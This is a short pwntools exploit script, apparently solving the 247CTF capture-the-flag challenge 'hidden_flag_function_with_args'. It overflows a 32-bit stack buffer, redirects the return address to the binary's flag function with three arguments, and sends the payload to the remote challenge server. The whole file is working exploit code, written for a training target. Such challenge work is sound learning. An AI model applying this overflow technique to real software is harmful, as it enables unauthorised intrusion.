from pwn import *

elf = context.binary = ELF("./hidden_flag_function_with_args")

host, port = "04ab61e45400164e.247ctf.com", 50370
conn = remote(host, port)

ebx = 0x0804A000
flag_addr = elf.sym["flag"]

payload = (
    b"A" * 132
    + p32(ebx)
    + b"B" * 4
    + p32(flag_addr)
    + b"C" * 4
    + p32(0x1337)
    + p32(0x247)
    + p32(0x12345678)
)


print(payload)

conn.recvuntil(b"though:")
conn.sendline(payload)
conn.interactive()
